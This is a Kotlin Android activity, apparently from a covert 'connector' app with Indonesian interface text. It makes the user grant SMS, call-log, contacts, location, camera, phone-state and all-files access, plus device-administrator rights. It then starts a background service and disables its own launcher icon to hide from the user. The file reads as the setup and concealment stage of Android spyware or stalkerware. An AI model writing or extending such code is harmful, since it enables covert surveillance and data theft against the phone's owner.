package com.kztutorial99.androidconnector

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.kztutorial99.androidconnector.databinding.ActivityMainBinding
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
    private val handler = Handler(Looper.getMainLooper())

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
    private val launcherAlias by lazy { ComponentName(this, "$packageName.MainLauncherAlias") }

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        ensureDeviceId()
        startConnectorService()

        val fromPanic = intent.getBooleanExtra("PANIC_MODE", false)

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(this, SilentSetupActivity::class.java))
        }

        binding.btnLaunch.setOnClickListener {
            hideAndExit()
        }

        updateUI(fromPanic)
    }

    override fun onResume() {
        super.onResume()
        updateUI(intent.getBooleanExtra("PANIC_MODE", false))
    }

    private fun updateUI(fromPanic: Boolean) {
        val allPermsOk = allPermissionsGranted()
        val adminOk = dpm.isAdminActive(adminComponent)
        val setupDone = allPermsOk && adminOk

        if (setupDone && !fromPanic) {
            hideAndExit()
            return
        }

        if (setupDone) {
            // Panic mode — semua sudah ok, tampilkan tombol sembunyikan
            binding.tvAccessStatus.text = "✅  Semua izin aktif"
            binding.tvAccessStatus.setTextColor(getColor(R.color.green))
            binding.btnAccessibility.visibility = View.GONE
            binding.btnLaunch.visibility = View.VISIBLE
        } else {
            // Belum semua izin diberikan
            val missing = mutableListOf<String>()
            if (!allPermsOk) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File")
            }
            if (!adminOk) missing.add("Admin Perangkat")

            binding.tvAccessStatus.text = "Izin belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin satu per satu."
            binding.tvAccessStatus.setTextColor(getColor(R.color.red))
            binding.btnAccessibility.text = "Berikan Izin →"
            binding.btnAccessibility.visibility = View.VISIBLE
            binding.btnLaunch.visibility = View.GONE
        }
    }

    private fun allPermissionsGranted(): Boolean {
        val runtimeOk = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        return runtimeOk && storageOk
    }

    private fun hideAndExit() {
        try {
            packageManager.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
        startConnectorService()
        finish()
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }
}
